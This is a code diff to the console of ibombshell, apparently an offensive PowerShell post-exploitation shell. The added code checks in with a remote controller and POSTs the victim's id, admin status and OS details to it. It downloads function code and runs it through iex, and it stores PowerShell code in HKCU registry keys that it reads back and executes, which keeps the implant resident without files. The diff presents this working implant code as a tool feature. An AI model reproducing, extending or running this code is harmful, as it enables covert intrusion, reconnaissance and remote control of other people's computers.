@@ -41,6 +41,7 @@ function console{
     $gtRawFunctions = "data/functions/"
     $functionsList = "https://raw.githubusercontent.com/ElevenPaths/ibombshell/Dev/functions.txt"
     [System.Collections.ArrayList]$global:functionsLoaded = "showcommands" , "showfunctions" , "quit"
+    [System.Collections.ArrayList]$global:internalFunctions =  "detect-OS", "printprompt" , "printMessage", "printData", "isadmin", "commandsearch", "addcommand"
     #Condition for exit
     $global:condition = $true
 
@@ -77,8 +78,9 @@ function console{
             {
                 try 
                 {
-                    $req = iwr -UseBasicParsing -Uri "$uriConsole/newibombshell/$id/$admin/$os_version/$os_arch"
-                    #iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$admin}
+                    $req = iwr -UseBasicParsing -Uri "$uriConsole/newibombshell/$id"
+                    $data = "custominfo`n" + $id + "`n" + $admin + "`n" + $os_version + $os_arch
+                    $req = iwr -UseBasicParsing -Method POST -Uri "$uriConsole/data-ibombshell/$id" -Body @{results=$data}
                     break
                 }
                 catch 
@@ -88,12 +90,42 @@ function console{
             }
         }
     }
-    else{
-        #getting function's list
-        $list = (new-object net.webclient).downloadstring($functionsList)
-        loader -command "system/detect-OS" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-    
-         $detected_os = detect-OS -basic 
+    else{     
+        $path = 'hkcu:\software\classes\ibombshell'
+        if((Test-Path $path)){
+            readfunctions  > $null
+        }else{
+            #loader functions default
+            try{
+                loader -command "system/detect-OS" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                loader -command "showfunctions" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                loader -command "showcommands" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                loader -command "addcommand" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                loader -command "commandsearch" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                loader -command "quit" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                loader -command "saveandloadfunctions" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                loader -command "version" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                loader -command "isadmin" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                loader -command "print/printprompt" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                loader -command "print/messagedata" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                addcommand -command "savefunctions" > $null
+                addcommand -command "deletefunctionsreg" > $null
+                addcommand -command "version" > $null
+            }catch {
+                
+             }
+        }
+
+        try{
+            #getting function's list
+            $list = (new-object net.webclient).downloadstring($functionsList)
+        }catch{
+                write-host "Check Internet Connection"
+                sleep 1
+                $list = ""
+        }
+
+        $detected_os = detect-OS -basic 
         if($detected_os -eq "windows") {
 	        $delimet = "`n"
             $delimet2 = "`r`n"
@@ -103,21 +135,7 @@ function console{
         }
         $global:commandList = $list.split($delimet)
 	    $localcommandlist = $list.split($delimet2)
-        #loader functions default
-        loader -command "showfunctions" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "showcommands" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "addcommand" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "commandsearch" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "quit" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "saveandloadfunctions" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "version" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "isadmin" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "print/printprompt" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        loader -command "print/messagedata" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        addcommand -command "savefunctions" > $null
-        addcommand -command "deletefunctionsreg" > $null
-        addcommand -command "version" > $null
-        readfunctions | iex > $null
+
         clear-host
         write-host -ForegroundColor Yellow $banner
         write-host 
@@ -224,3 +242,66 @@ function console{
     }
 
 }
+
+# READFUNCTIONS BEGIN
+function readFunctions{
+            $path = 'HKCU:\Software\Classes\ibombshell'
+            $path_internals = 'hkcu:\software\classes\ibombshell\internals'
+            
+            # Internal
+            runRead -path $path_internals -isCommand $false 
+
+            # No Internal
+            runRead -path $path -isCommand $true              
+}
+
+function runRead{
+        param(
+            [Parameter(Mandatory)]
+            [String] $path,
+            [Parameter(Mandatory)]
+            [Boolean] $isCommand
+        )
+
+        function giveNameFunctionReg{
+            param(
+                    [Parameter(Mandatory)]
+                    [String] $SubKey
+            )
+
+            $max = $SubKey.Split("\").Length
+            return $SubKey.Split("\")[$max-1]
+
+        }
+
+        if(test-path $path)
+        {
+            
+            $listFunctions = (Get-ChildItem $path).Name
+            $code = ""
+            cd hkcu:
+
+            foreach($i in $listFunctions)
+            { 
+                if ($i -ne "internals"){
+                    $code = ""
+                    $num = ((Get-Item -Path "$i" | Select-Object -ExpandProperty Property) | ForEach-Object {
+                    New-Object psobject -Property @{"property"=$_;
+                    "Value" = (Get-ItemProperty -Path "$i" -Name $_).$_}}).Value
+
+                    foreach($j in $num){
+                        $code += $j + "`r`n"}
+                        write-host $code
+                        $code | iex
+                        if (($name -ne "internals") -and $isCommand) {
+                            addCommand -command (giveNameFunctionReg -SubKey $i) > $null
+                        } 
+                    
+                }
+            }
+                            
+                c:
+
+                return "done"
+        }
+} # READFUNCTIONS END
